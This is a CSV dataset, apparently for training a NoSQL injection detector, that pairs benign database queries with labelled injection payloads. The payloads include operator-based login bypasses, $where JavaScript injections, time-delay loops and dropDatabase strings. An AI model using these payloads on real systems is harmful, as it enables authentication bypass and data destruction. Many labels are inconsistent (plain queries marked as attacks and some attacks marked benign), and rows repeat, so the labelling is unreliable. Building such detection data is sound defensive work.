log,label
"{""user"": ""{}"", ""password"": ""{}""}",0
"{""username"": {""$regex"": ""^{}""}}",NoSQL
"{""username"": {""$ne"": ""{}""}}",NoSQL
"{""username"": {""$gt"": ""{}""}}",NoSQL
"{""user"": ""hacker"", ""password"": {""$ne"": """"}}",NoSQL
"{""user"": req.query.user, ""password"": req.query.password}",0
"{""user"": ""hacker"", ""password"": {""&ne"": """"}}",NoSQL
"{""user"": req.params['user'], ""password"": req.params['password']}",0
"{""user"": request.GET['user'], ""password"": request.GET['password']}",0
"{""user"": req.query.user_id, ""password"": req.query.user_pass}",0
"{""user"": req.params['user_id'], ""password"": req.params['user_pass']}",0
"db.users.find({""user"": ""user123"", ""email"": ""user123@example.com""})",0
"db.users.find({""user"": request.GET['user'], ""password"": request.GET['password']})",0
"db['users'].find({:user => req.params['user'], :password => req.params['password']})",0
"db.collection('users').find({""user"": ""hacker"", ""password"": {""&ne"": """"}})",NoSQL
"}); db.dropDatabase(); db.insert({username: ‘dummy ’, password: ‘dummy’",NoSQL
"{""username"": {""$eq"": ""admin""}, ""password"": {""$regex"": ""^md"" }}",0
login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto,NoSQL
login%255B%2524gt%255D%3Dadmin%26login%255B%2524lt%255D%3Dtest%26pass%255B%2524ne%255D%3D1,NoSQL
"{""type"": ""user"",""name"": ""oops"", ""roles"": [""_admin""], ""roles"": [], ""password"":""apple""}",NoSQL
"true, $where: '1 == 1'",NoSQL
"{""$where"": ""this.username === '{}'""}",NoSQL
"{""$or"": [{""username"": ""{}""}, {""isAdmin"": true}]}",NoSQL
"{ ""$or"": [ {}, { ""a"": ""a",NoSQL
"' } ], $comment:'successful MongoDB injection'",NoSQL
"{""user"": ""alice"", ""password"": ""123456""}",0
"{""username"": {""$regex"": ""^test""}}",0
"{""username"": {""$ne"": ""testuser""}}",0
"{""username"": {""$gt"": ""guest""}}",0
"{""user"": ""john"", ""password"": ""qwerty""}",0
"{""user"": req.query.name, ""password"": req.query.pass}",0
"{""user"": req.params['name'], ""password"": req.params['pass']}",0
"{""user"": request.GET['name'], ""password"": request.GET['pass']}",0
"db.users.find({""user"": ""john"", ""age"": {""$gt"": 25}})",0
"db.users.find({""user"": ""user"", ""age"": {""$gt"": 30}})",0
"db.users.find({""user"": request.GET['name'], ""password"": request.GET['pass']})",0
"db['users'].find({:user => req.params['name'], :password => req.params['pass']})",0
' && this.password.match(/.*/)//+%00,NoSQL
' && this.passwordzz.match(/.*/)//+%00,NoSQL
';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);,NoSQL
';sleep(5000);,NoSQL
0;return true;var%20password%20=%20this.password.match(/.*/);,NoSQL
0;return true,NoSQL
|| 1==1,NoSQL
db.injection.insert({success:1});,NoSQL
|| sleep(5),NoSQL
%27%3B%20return%20%27%27%20==%20%27,NoSQL
login%5B%24gt%5D=admin&login%5B%24lt%5D=test&pass%5B%24ne%5D=1,NoSQL
%27%20&&%20this.password.match%28%2F.%2A%2F%29%2F%2F%2B%2500,NoSQL
db.injection.insert({success:1});,NoSQL
|| sleep(5),NoSQL
|| 1==1,NoSQL
0;return true;var%20password%20=%20this.password.match(/.*/);,NoSQL
0;return true,NoSQL
';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);,NoSQL
';sleep(5000);,NoSQL
|| this.password.match(/.*/)//+%00,NoSQL
' && this.password.match(/.*/)//+%00,NoSQL
' && this.passwordzz.match(/.*/)//+%00,NoSQL
';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);,NoSQL
';sleep(5000);,NoSQL
0;return true;var%20password%20=%20this.password.match(/.*/);,NoSQL
"true, $where: '1 == 1'",NoSQL
"db.collection('users').find({:user => req.params['user'], :password => req.params['password']})",0
this.hidden == false && this.category == ''; return '' == '',0
}); db.dropDatabase();,NoSQL
"{""category"": ""electronics""}",0
"{""category"": ""electronics"", ""price"": {""$gt"": 200}}",0
"{""category"": ""electronics"", ""price"": {""$gt"": 200}, ""name"": {""$regex"": ""^S""}}",0
{},0
"{""selector"": {""department"": ""engineering""}}",0
"{""_id"": ""001"", ""name"": ""John Doe"", ""department"": ""HR"", ""salary"": 50000}",0
SELECT * FROM beer-sample WHERE city='' AND '1'='0' UNION SELECT * FROM system:keyspaces WHERE '1'='1',NoSQL
PartitionKey eq 'Customers' and RowKey eq '12345',0
PartitionKey eq 'Employees' and RowKey eq '44455' and Password eq 'password',0
PartitionKey eq 'Children' and RowKey eq '1253' and  Email eq 'email',0
PartitionKey eq 'Patients' and RowKey eq '15334' and Phone eq 'phone',0
0;var date=new Date(); do{curDate = new Date();}while(curDate-date<10000),NoSQL
"{""user"": ""{}"", ""password"": ""{}""}",0
"{""username"": {""$regex"": ""^{}""}}",NoSQL
"{""username"": {""$ne"": ""{}""}}",NoSQL
"{""username"": {""$gt"": ""{}""}}",NoSQL
"{""user"": ""hacker"", ""password"": {""$ne"": """"}}",NoSQL
"{""user"": req.query.user, ""password"": req.query.password}",0
"{""user"": ""hacker"", ""password"": {""&ne"": """"}}",NoSQL
"{""user"": req.params['user'], ""password"": req.params['password']}",0
"{""user"": request.GET['user'], ""password"": request.GET['password']}",0
"db.users.find({""user"": request.GET['user'], ""password"": request.GET['password']})",0
"db['users'].find({:user => req.params['user'], :password => req.params['password']})",0
"db.collection('users').find({""user"": ""hacker"", ""password"": {""&ne"": """"}})",NoSQL
"}); db.dropDatabase(); db.insert({username: ‘dummy ’, password: ‘dummy’",NoSQL
"{""username"": {""$eq"": ""admin""}, ""password"": {""$regex"": ""^md"" }}",0
login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto,NoSQL
login%255B%2524gt%255D%3Dadmin%26login%255B%2524lt%255D%3Dtest%26pass%255B%2524ne%255D%3D1,NoSQL
"{""type"": ""user"",""name"": ""oops"", ""roles"": [""_admin""], ""roles"": [], ""password"":""apple""}",NoSQL
"db.users.find({""name"": {""$regex"": ""^j""}})",0
"db.users.find({""bio"": {""$exists"": true, ""$ne"": """"}})",0
"true, $where: '1 == 1'",NoSQL
"{""$where"": ""this.username === '{}'""}",NoSQL
"{""$or"": [{""username"": ""{}""}, {""isAdmin"": true}]}",NoSQL
"{ ""$or"": [ {}, { ""a"": ""a",NoSQL
"' } ], $comment:'successful MongoDB injection'",NoSQL
"{""user"": ""alice"", ""password"": ""123456""}",0
"{""username"": {""$regex"": ""^test""}}",0
"{""username"": {""$ne"": ""testuser""}}",0
"{""username"": {""$gt"": ""guest""}}",0
"{""user"": ""john"", ""password"": ""qwerty""}",0
"{""user"": req.query.name, ""password"": req.query.pass}",0
"{""user"": req.params['name'], ""password"": req.params['pass']}",0
"{""user"": request.GET['name'], ""password"": request.GET['pass']}",0
"db.users.find({""user"": ""john"", ""age"": {""$gt"": 25}})",0
"db.users.find({""user"": ""user"", ""age"": {""$gt"": 30}})",0
"db.users.find({""user"": request.GET['name'], ""password"": request.GET['pass']})",0
"db['users'].find({:user => req.params['name'], :password => req.params['pass']})",0
' && this.password.match(/.*/)//+%00,NoSQL
' && this.passwordzz.match(/.*/)//+%00,NoSQL
';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);,NoSQL
';sleep(5000);,NoSQL
0;return true;var%20password%20=%20this.password.match(/.*/);,NoSQL
0;return true,NoSQL
|| 1==1,NoSQL
db.injection.insert({success:1});,NoSQL
%27%3B%20return%20%27%27%20==%20%27,NoSQL
login%5B%24gt%5D=admin&login%5B%24lt%5D=test&pass%5B%24ne%5D=1,NoSQL
%27%20&&%20this.password.match%28%2F.%2A%2F%29%2F%2F%2B%2500,NoSQL
db.injection.insert({success:1});,NoSQL
|| sleep(5),NoSQL
"db.users.aggregate([{""$group"": {""_id"": ""$phone"", ""count"": {""$sum"": 1}}}, {""$match"": {""count"": {""$gt"": 1}}}])",0
"db.users.find().sort({""status"": 1, ""age"": -1})",0
"db.users.find({""login_count"": {""$gt"": 10}, ""last_login"": {""$gte"": ISODate(""2023-06-01"")}})",0
"db.users.find({""login_count"": {""$gt"": 10}, ""last_login"": {""$gte"": ISODate(""2023-06-01"")}})",0
"db.users.remove({""user"": ""user123""})",0
db.database.getIndexes(),0
"db.database.createIndex({""user"": 1})",0
db.database.stats(),0
db.database.drop(),0
"db.database.insert({$where: ""this.user === \""admin\"" && this.password === \""password\""}""})",NoSQL
"db.database.update({""user"": ""user123""}, {""$set"": {$where: ""this.password === \""new_password\""""}})",NoSQL
"db.database.drop({$where: ""1 === 1""})",NoSQL
"db.database.stats({$where: ""1 === 1""})",NoSQL
"db.database.getIndexes({$where: ""1 === 1""})",NoSQL
"db.database.createIndex({$where: ""this.user === \""user123\""})",NoSQL
"db.database.remove({$where: ""this.user === \""admin123\""""})",NoSQL
"db.users.find({""last_login"": {""$gte"": ISODate(""2023-07-01"")}})",0
"db.users.find({""last_login"": {""$lt"": ISODate(""2023-05-25"")}})",0
"db.users.find().sort({""age"": -1})",0
"db.users.find({""status"": ""active""})",0
"db.users.find({""registration_date"": {""$gte"": ISODate(""2023-07-01"")}})",0
"db.users.find({""profile_info"": null})",0
"db.users.find({""user"": {""$regex"": ""^A""}})",0
"db.users.find({""email"": {""$exists"": true}})",0
"db.users.find({""age"": {""$gt"": 20, ""$lt"": 40}})",0
"db.users.find({""role"": ""admin""})",0
0;return true;var%20password%20=%20this.password.match(/.*/);,NoSQL
0;return true,NoSQL
';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);,NoSQL
';sleep(5000);,NoSQL
|| this.password.match(/.*/)//+%00,NoSQL
' && this.password.match(/.*/)//+%00,NoSQL
' && this.passwordzz.match(/.*/)//+%00,NoSQL
';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);,NoSQL
';sleep(5000);,NoSQL
0;return true;var%20password%20=%20this.password.match(/.*/);,NoSQL
"true, $where: '1 == 1'",NoSQL
"db.collection('users').find({:user => req.params['user'], :password => req.params['password']})",0
this.hidden == false && this.category == ''; return '' == '',0
"{""category"": ""electronics""}",0
"{""category"": ""electronics"", ""price"": {""$gt"": 200}}",0
"{""category"": ""electronics"", ""price"": {""$gt"": 200}, ""name"": {""$regex"": ""^S""}}",0
{},0
"{""selector"": {""department"": ""engineering""}}",0
"{""_id"": ""001"", ""name"": ""John Doe"", ""department"": ""HR"", ""salary"": 50000}",0
SELECT * FROM beer-sample WHERE city='' AND '1'='0' UNION SELECT * FROM system:keyspaces WHERE '1'='1',NoSQL
PartitionKey eq 'Customers' and RowKey eq '12345',0
PartitionKey eq 'Employees' and RowKey eq '44455' and Password eq 'password',0
PartitionKey eq 'Children' and RowKey eq '1253' and  Email eq 'email',0
PartitionKey eq 'Patients' and RowKey eq '15334' and Phone eq 'phone',0
0;var date=new Date(); do{curDate = new Date();}while(curDate-date<10000),NoSQL
"db.collection.find({$where: ""function() {return this.username.indexOf(""admin"") !== -1}""})",NoSQL
"db.collection.find({$or: [{""status"": ""active""}, {""isAdmin"": true}]})",NoSQL
"db.collection.find({""email"": {""$regex"": ""^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$""}})",NoSQL
"db.collection.find({$where: ""this.password.length >= 12""})",NoSQL
"{""user"": ""{}"", ""password"": ""pass""}",0
"{""user"": ""user"", ""password"": ""{}""}",0
"{""user"": ""admin"", ""password"": ""admin""}",0
"{""user"": ""testuser"", ""password"": ""testuser""}",0
"{""user"": ""$username"", ""password"": ""$password""}",0
"{""id"": {}, ""value"": 1}",0
"{""name"": ""John"", ""age"": {}}",0
"{""$where"": ""this.age >= {}""}",NoSQL
"{""user"": ""admin"", ""password"": {}}",NoSQL
"{""user"": ""test"", ""password"": ""test""}",NoSQL
"{""user"": {""$ne"": ""testuser""}, ""password"": ""pass""}",NoSQL
"{""username"": {""$regex"": ""^test""}}",NoSQL
"{""user"": {""$gt"": ""guest""}, ""password"": ""pass""}",NoSQL
"{""type"": ""user"", ""name"": ""admin"", ""roles"": [""_admin""], ""password"": ""123456""}",NoSQL
"{ ""$or"": [ {""username"": ""admin""}, {""isAdmin"": true} ]}",NoSQL
"{""username"": {""$regex"": "".*{}.*""}}",NoSQL
"{""user"": ""admin"", ""password"": {""$nin"": [""pass"", ""test""]}}",NoSQL
"{""$where"": ""this.username == '{}'""}",NoSQL
"{""user"": {""$in"": [""admin"", ""root""]}, ""password"": ""password""}",NoSQL
"{""username"": {""$regex"": ""^{}$"", ""$options"": ""i""}}",NoSQL
"{""user"": {""$exists"": true}, ""password"": {""$exists"": true}}",NoSQL
"{""user"": {""$exists"": false}, ""password"": {""$exists"": false}}",NoSQL
"{""name"": {""$not"": { ""$type"": ""string"" }}}",NoSQL
"{""name"": {""$mod"": [5, 0]}}",NoSQL
"{""$where"": ""this.password.length > 10""}",NoSQL
"{""user"": ""test"", ""password"": ""pass""}",0
"{""name"": ""John Doe"", ""age"": {}}",0
"{""$or"": [{""username"": ""test""}, {""isAdmin"": false}]}",0
"{""user"": ""guest"", ""password"": ""guest""}",0
"{""type"": ""admin"", ""name"": ""admin"", ""roles"": [""admin""], ""password"": ""admin""}",0
"{ ""$and"": [ {""username"": ""admin""}, {""isAdmin"": true} ]}",0
"{""$nor"": [{""username"": ""testuser""}, {""isAdmin"": false}]}",NoSQL
"{""user"": {""$size"": 3}, ""password"": ""123456""}",NoSQL
"{""$where"": ""this.age <= {}""}",NoSQL
"{""name"": {""$type"": 2}}",NoSQL
"{""name"": {""$type"": 16}}",NoSQL
"{""username"": {""$regex"": ""^test"", ""$options"": ""i""}}",NoSQL
"{""user"": ""guest"", ""password"": {""$ne"": ""guest""}}",NoSQL
"{""user"": {""$regex"": ""^{}$""}, ""password"": ""pass""}",NoSQL
"{""username"": {""$gt"": null}}",NoSQL
"{""username"": {""$exists"": false}, ""password"": {""$exists"": true}}",NoSQL
"{""name"": {""$not"": { ""$type"": 3 }}}",NoSQL
"{""name"": {""$not"": { ""$type"": 18 }}}",NoSQL
"{""$where"": ""this.password.length <= 5""}",NoSQL
"{""user"": ""test"", ""password"": ""password""}",0
"{""name"": ""Alice"", ""age"": {}}",0
"{""$or"": [{""username"": ""user""}, {""isAdmin"": true}]}",0
"{""user"": ""john"", ""password"": ""qwerty""}",0
"{""type"": ""user"", ""name"": ""user"", ""roles"": [""user""], ""password"": ""user""}",0
"{ ""$and"": [ {""username"": ""test""}, {""isAdmin"": false} ]}",0
"{""user"": [""testuser"", ""admin""], ""password"": ""password""}",NoSQL
"{""username"": {""$regex"": ""{}|admin"", ""$options"": ""i""}}",NoSQL
"{""$and"": [{""username"": ""test""}, {""isAdmin"": false}] }",NoSQL
"{""user"": {""$size"": 1}, ""password"": ""test""}",NoSQL
"{""$where"": ""this.age > 20 && this.gender === 'male'""}",NoSQL
"{""name"": {""$type"": 4}}",NoSQL
"{""name"": {""$type"": 17}}",NoSQL
"{""username"": {""$regex"": ""^{}$""}, ""password"": {""$ne"": ""test""}}",NoSQL
"{""username"": {""$gt"": null}, ""password"": {""$eq"": ""password""}}",NoSQL
"{""name"": {""$exists"": true}, ""password"": {""$exists"": false}}",NoSQL
"{""name"": {""$not"": { ""$type"": 1 }}}",NoSQL
"{""name"": {""$not"": { ""$type"": 19 }}}",NoSQL
"{""$where"": ""this.password.length > 8 && this.name === 'admin'""}",NoSQL
"{""user"": ""admin"", ""password"": ""admin""}",NoSQL
"{""user"": ""root"", ""password"": ""root""}",NoSQL
"{""user"": ""admin"", ""password"": ""password123""}",NoSQL
"{""user"": ""testuser"", ""password"": ""testuser123""}",NoSQL
"{""user"": ""test"", ""password"": ""test""}",0
